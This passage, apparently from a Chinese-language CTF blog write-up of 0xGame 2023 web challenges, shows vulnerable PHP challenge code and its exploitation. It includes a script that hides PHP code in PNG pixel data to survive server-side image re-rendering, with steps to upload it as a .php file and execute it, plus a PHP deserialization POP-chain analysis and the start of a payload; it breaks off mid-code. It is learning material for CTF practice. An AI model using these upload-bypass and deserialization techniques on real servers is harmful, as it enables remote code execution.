class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;/head&gt;<br>    &lt;body&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">pt</span>-5 <span class="hljs-title">p</span>-5 <span class="hljs-title">my</span>-5 <span class="hljs-title">border</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h1</span>&gt;<span class="hljs-title">Gravatar</span>&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">Upload</span> <span class="hljs-title">you</span> <span class="hljs-title">personal</span> <span class="hljs-title">avatar</span>!&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">Your</span> <span class="hljs-title">upload</span> <span class="hljs-title">path</span>: &lt;<span class="hljs-title">code</span>&gt;&lt;?=&#x27;<span class="hljs-title">uploads</span>/&#x27;.$<span class="hljs-title">user_dir</span>.&#x27;/&#x27;?&gt;&lt;/<span class="hljs-title">code</span>&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">avatar</span>&#x27;]) &amp;&amp; <span class="hljs-title">file_exists</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">avatar</span>&#x27;])) </span>&#123; <span class="hljs-meta">?&gt;</span><br>                &lt;p&gt;&lt;img src=<span class="hljs-string">&quot;&lt;?=<span class="hljs-subst">$_SESSION</span>[&#x27;avatar&#x27;]?&gt;&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">rounded</span>&quot; <span class="hljs-title">width</span>=&quot;200&quot; <span class="hljs-title">height</span>=&quot;200&quot;&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> &#125; <span class="hljs-title">else</span> </span>&#123; <span class="hljs-meta">?&gt;</span><br>                &lt;p&gt;You have not uploaded your avatar yet!&lt;/p&gt;<br>            <span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br><br>            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">info</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">msg</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">display</span>:<span class="hljs-title">none</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">form</span> <span class="hljs-title">onsubmit</span>=&quot;<span class="hljs-title">upload</span>(); <span class="hljs-title">return</span> <span class="hljs-title">false</span>;&quot;&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; /&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">Upload</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span>&quot;/&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">        <span class="hljs-title">function</span> <span class="hljs-title">upload</span>() </span>&#123;<br>            $.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;upload.php&#x27;</span>,<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">cache</span>: <span class="hljs-literal">false</span>,<br>                <span class="hljs-attr">data</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>($(<span class="hljs-string">&#x27;form&#x27;</span>)[<span class="hljs-number">0</span>]),<br>                processData: <span class="hljs-literal">false</span>,<br>                contentType: <span class="hljs-literal">false</span>,<br>                success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;<br>                    $(<span class="hljs-string">&#x27;#msg&#x27;</span>).<span class="hljs-title function_ invoke__">text</span>(data).<span class="hljs-title function_ invoke__">show</span>();<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">//这里存储着一个文件上传目录地址</span><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-comment">//如果目录不存在则mkdir创建文件目录</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>);<br>&#125;<br><br><span class="hljs-comment">//检查文件上传类型，对应的由相应函数创建一个新图像</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//获取上传文件的拓展名，接着在搞一个新文件路径，由原文件的md5值和拓展名构成</span><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><br><span class="hljs-comment">//接着在以filepath为文件名创建一个新图像--这里就可以感觉出是二次渲染了</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>] = <span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里当初分析代码的时候也没发现竟然是一道二次渲染题。。。果然还是太菜了，代码审计功底也垃圾</p>
<p>这里对二次渲染用的不多，因此只得啃wp了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">题⽬的功能其实是个简单的 &quot;⼆次渲染&quot;, ⼆次渲染就是指服务端对⽤户上传的图⽚进⾏了⼆次处理, 例如图⽚的裁<br>切, 添加⽔印等等<br><br>如果只是在图⽚的末尾简单的添加了 PHP 代码并上传, 那么经过⼆次渲染之后的图⽚是不会包含这段代码的, 因此<br>需要去找⼀些绕过 GD 库⼆次渲染的脚本, 然后再构造图⽚⻢<br></code></pre></td></tr></table></figure>
<p>看了几篇文章感觉二次渲染就是一个在你上传一个图片之后，服务器会去提取一个图片基本组成要素（也就是你上传的）之后在次组合成一个新图像去自己新建一个图片名字去上传保存–这里解释的也有点垃圾，后续写完wp将其中的知识点好好学学。</p>
<p>这里先复现一波png图片的上传吧，原理不细说了，参考文章如下：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-12">https://xz.aliyun.com/t/2657#toc-12</a></p>
<p>这里有两种方法，这里我也就直接尝试其中一个简单的了（因为懒┭┮﹏┭┮</p>
<p>直接上国外大牛的脚本，一键生成png-他这里是向png写入idat数据块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>之后我们可以在php环境下运行上述代码，或者直接phpstorm运行也可，将生成的png直接上传，不过这里代码并没有限制php后缀的文件，我们在页面上传后直接bp修改后缀为php即可</p>
<p>![image-20231023173148935](0xGame 2023/image-20231023173148935.png)</p>
<p>如图将png改为php上传，之后访问链接执行恶意代码即可</p>
<p>![image-20231023173221731](0xGame 2023/image-20231023173221731.png)</p>
<p>拿到flag</p>
<h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="Week-2-ez-unserialize"></a>[Week 2] ez_unserialize</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<br>            <span class="hljs-keyword">return</span> True;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>依旧是浏览敏感函数，这里可以发现<code>$this-&gt;funcs[$name](...$args);</code>就是我们最终要利用的地方，那我们思考如何调用call魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__call()，在对象中调用一个不可访问方法时调用<br></code></pre></td></tr></table></figure>
<p>依据上述我们可以找到<code>$this-&gt;helper-&gt;clean($this-&gt;key);</code>敏感语句，倘若我们将helper赋值为Helper对象，而其中也没有clean方法，那我们便成功调用，接下来在判断如何调用其所在的expired方法，我们接着浏览可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>       &#125;<br></code></pre></td></tr></table></figure>
<p>这意味着如果我们将value变量赋值为Cache对象，我们便可以成功调用，那接下来在判断如何调用其所在的set魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__set()，在给不可访问属性赋值时调用<br></code></pre></td></tr></table></figure>
<p>依据上述我们可以找到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>       &#125;<br></code></pre></td></tr></table></figure>
<p>这意味着如果我们将storage赋值为Storage对象时，接着将key变量赋值为对象中没有的属性，那我们便可以成功调用。综上所述我们pop链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">DataObject.__destruct() -&gt; Storage.__set() -&gt; Cache.expired() -&gt; Helper.__call()<br></code></pre></td></tr></table></figure>
<p>接下来就是变量赋值问题了，这里我也是有点手足无措，只好借助wp了。。。payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span 